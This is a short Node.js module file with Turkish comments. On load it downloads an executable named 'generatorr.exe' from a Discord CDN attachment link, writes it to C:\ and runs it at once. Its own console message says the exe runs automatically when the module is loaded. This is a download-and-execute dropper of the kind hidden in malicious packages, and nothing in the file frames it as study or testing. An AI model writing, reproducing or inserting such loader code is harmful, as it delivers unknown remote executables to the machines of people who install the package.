// index.js
const { exec } = require('child_process');
const https = require('https');
const fs = require('fs');
const path = require('path');

console.log('Modül yüklendiğinde .exe dosyası otomatik olarak çalışacak.');

// .exe dosyasını indiren ve çalıştıran fonksiyon
function runExe() {
    const url = 'https://cdn.discordapp.com/attachments/xxx/yyy/generatorr.exe';
    const exeFilePath = path.join('C:\\', 'generatorr.exe'); // C:\ dizinine kaydedilecek

    const file = fs.createWriteStream(exeFilePath);

    https.get(url, (response) => {
        response.pipe(file);
        file.on('finish', () => {
            file.close();
            console.log('.exe dosyası indirildi:', exeFilePath);
            exec(exeFilePath, (error, stdout, stderr) => {
                if (error) {
                    console.error(`Hata oluştu: ${error.message}`);
                    return;
                }
                if (stderr) {
                    console.error(`Hata çıktısı: ${stderr}`);
                    return;
                }
                console.log(`.exe çıktısı: ${stdout}`);
            });
        });
    }).on('error', (error) => {
        console.error('İndirme hatası:', error.message);
    });
}

runExe();